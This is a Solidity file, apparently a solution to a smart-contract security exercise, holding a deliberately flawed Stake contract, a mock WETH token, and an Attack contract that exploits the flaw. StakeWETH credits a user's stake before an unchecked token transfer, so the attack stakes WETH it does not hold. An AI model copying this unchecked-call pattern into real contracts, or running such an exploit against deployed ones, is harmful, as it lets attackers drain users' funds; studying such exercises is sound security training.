// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount; // The Stake contract blindly updates your stake in this line (inside StakeWETH()):
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}

contract Attack {
    Stake public stake;
    address public weth;

    constructor(address _weth, Stake _stake) {
        weth = _weth;
        stake = _stake;
    }

    function attack() external payable {

        // ...note that approve works even if u have nothing
        (bool approve, ) = address(weth).call(abi.encodeWithSignature("approve(address,uint256)", stake, type(uint256).max));
        require(approve, "approved failed");

        // staking weth that i dont have but its fine since the allowance passes
        (bool stakeWeth, ) = address(stake).call(abi.encodeWithSignature("StakeWETH(uint256)", 0.001 ether + 1));
        require(stakeWeth, "stakeWeth failed");

        // let us now stake some real thing
        (bool stakeEth, ) = address(stake).call{value: 0.001 ether + 2}(abi.encodeWithSignature("StakeETH()"));
        require(stakeEth, "stakeEth failed");

        // unstake ur 0.001 but leaving behind some eth and wei in the contract
        (bool unstake, ) = address(stake).call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether));
        require(unstake, "unstake failed"); 

    }

}

contract WETH is ERC20 {

    constructor() ERC20("weth", "WETH") {
        _mint(msg.sender, 10 ether);
    }

    function mint(address _stake) public {
        _mint(_stake, 10 ether);
    }

}